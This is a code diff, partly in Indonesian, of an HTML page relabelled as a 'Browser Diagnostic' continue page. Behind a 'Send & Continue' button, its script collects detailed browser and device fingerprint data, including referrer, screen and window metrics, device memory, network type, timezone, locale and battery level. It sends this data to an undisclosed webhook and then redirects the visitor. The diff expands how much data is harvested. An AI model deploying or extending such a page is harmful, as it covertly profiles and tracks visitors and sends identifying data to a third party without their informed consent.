@@ -2,51 +2,52 @@
 <html lang="id">
 
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>Redirect Collector</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+
+<title>Browser Diagnostic Redirect</title>
 
 <style>
 
 body{
-    margin:0;
-    min-height:100vh;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    background:#202124;
-    font-family:Arial,sans-serif;
+margin:0;
+height:100vh;
+display:flex;
+align-items:center;
+justify-content:center;
+background:#202124;
+font-family:Arial;
 }
 
 .card{
-    background:white;
-    width:90%;
-    max-width:420px;
-    padding:35px;
-    border-radius:16px;
-    text-align:center;
-    box-shadow:0 10px 30px rgba(0,0,0,.3);
+background:white;
+width:90%;
+max-width:420px;
+padding:35px;
+border-radius:18px;
+text-align:center;
+box-shadow:0 10px 30px #0005;
 }
 
 button{
-    width:100%;
-    padding:15px;
-    border:0;
-    border-radius:10px;
-    background:#1a73e8;
-    color:white;
-    font-size:17px;
-    cursor:pointer;
+width:100%;
+padding:15px;
+border:0;
+border-radius:10px;
+background:#1a73e8;
+color:white;
+font-size:17px;
+cursor:pointer;
 }
 
 button:disabled{
-    background:#888;
+background:#888;
 }
 
 #status{
-    margin-top:20px;
-    font-size:14px;
+margin-top:20px;
+font-size:14px;
 }
 
 </style>
@@ -59,19 +60,22 @@ button:disabled{
 
 <div class="card">
 
-<h2>Lanjutkan</h2>
+<h2>Continue</h2>
 
 <p>
-Klik tombol untuk membuka halaman tujuan
+Browser Diagnostic
 </p>
 
-<button id="btn">
-Kirim Data
+
+<button id="send">
+Kirim & Lanjut
 </button>
 
+
 <div id="status">
-Menunggu...
+Ready
 </div>
+
 
 </div>
 
@@ -85,6 +89,37 @@ const WEBHOOK =
 
 
 
+async function batteryInfo(){
+
+try{
+
+if(navigator.getBattery){
+
+const b =
+await navigator.getBattery();
+
+
+return {
+
+level:
+Math.round(b.level*100)+"%",
+
+charging:
+b.charging
+
+};
+
+}
+
+}catch(e){}
+
+
+return null;
+
+}
+
+
+
 function collect(){
 
 
@@ -92,8 +127,8 @@ const n=navigator;
 
 const c =
 n.connection ||
-n.mozConnection ||
-n.webkitConnection;
+n.webkitConnection ||
+n.mozConnection;
 
 
 
@@ -101,7 +136,8 @@ return {
 
 
 event:
-"browser_metadata",
+"browser_full_metadata",
+
 
 
 timestamp:
@@ -109,7 +145,7 @@ new Date().toISOString(),
 
 
 
-page:{
+location_page:{
 
 url:
 location.href,
@@ -118,7 +154,10 @@ title:
 document.title,
 
 referrer:
-document.referrer
+document.referrer,
+
+origin:
+location.origin
 
 },
 
@@ -148,7 +187,10 @@ cookieEnabled:
 n.cookieEnabled,
 
 doNotTrack:
-n.doNotTrack
+n.doNotTrack || null,
+
+javaEnabled:
+n.javaEnabled ? n.javaEnabled():false
 
 },
 
@@ -171,6 +213,9 @@ screen.availHeight,
 colorDepth:
 screen.colorDepth,
 
+pixelDepth:
+screen.pixelDepth,
+
 pixelRatio:
 devicePixelRatio
 
@@ -180,11 +225,23 @@ devicePixelRatio
 
 window:{
 
-width:
+innerWidth:
 innerWidth,
 
-height:
-innerHeight
+innerHeight:
+innerHeight,
+
+outerWidth:
+outerWidth,
+
+outerHeight:
+outerHeight,
+
+scrollWidth:
+document.documentElement.scrollWidth,
+
+scrollHeight:
+document.documentElement.scrollHeight
 
 },
 
@@ -199,14 +256,17 @@ memory:
 n.deviceMemory || null,
 
 touch:
-n.maxTouchPoints > 0
+n.maxTouchPoints>0,
+
+touchPoints:
+n.maxTouchPoints || 0
 
 },
 
 
 
 network:
-c ? {
+c?{
 
 type:
 c.effectiveType,
@@ -224,17 +284,34 @@ c.saveData
 
 
 
+display:{
+
+darkMode:
+matchMedia("(prefers-color-scheme:dark)").matches,
+
+reducedMotion:
+matchMedia("(prefers-reduced-motion:reduce)").matches
+
+},
+
+
+
 time:{
 
 timezone:
-Intl.DateTimeFormat()
-.resolvedOptions()
-.timeZone,
+Intl.DateTimeFormat().resolvedOptions().timeZone,
+
+offset:
+new Date().getTimezoneOffset(),
+
+locale:
+Intl.DateTimeFormat().resolvedOptions().locale,
 
 local:
 new Date().toString()
 
 }
+
 
 
 };
@@ -245,8 +322,8 @@ new Date().toString()
 
 
 document
-.getElementById("btn")
-.onclick=function(){
+.getElementById("send")
+.onclick=async function(){
 
 
 this.disabled=true;
@@ -261,45 +338,44 @@ status.innerHTML=
 
 
 
-const data=
+let data =
 collect();
 
 
 
-const query =
+data.battery =
+await batteryInfo();
+
+
+
+const params =
 new URLSearchParams();
 
 
+Object.keys(data)
+.forEach(k=>{
 
-Object.entries(data)
-.forEach(([key,value])=>{
-
-query.append(
-key,
-typeof value==="object"
+params.append(
+k,
+typeof data[k]=="object"
 ?
-JSON.stringify(value)
+JSON.stringify(data[k])
 :
-value
+data[k]
 );
 
 });
 
 
 
-const url =
-WEBHOOK +
-"?" +
-query.toString();
-
-
-
-fetch(url)
+fetch(
+WEBHOOK+"?"+params.toString()
+)
 .then(()=>{
 
 
 status.innerHTML=
-"Berhasil";
+"Terkirim";
 
 
 setTimeout(()=>{
@@ -310,7 +386,6 @@ location.href=
 
 
 },1000);
-
 
 
 })
@@ -321,19 +396,7 @@ status.innerHTML=
 "Gagal";
 
 
-setTimeout(()=>{
-
-
-location.href=
-"https://mail.google.com";
-
-
-},1000);
-
-
-
 });
-
 
 
 };
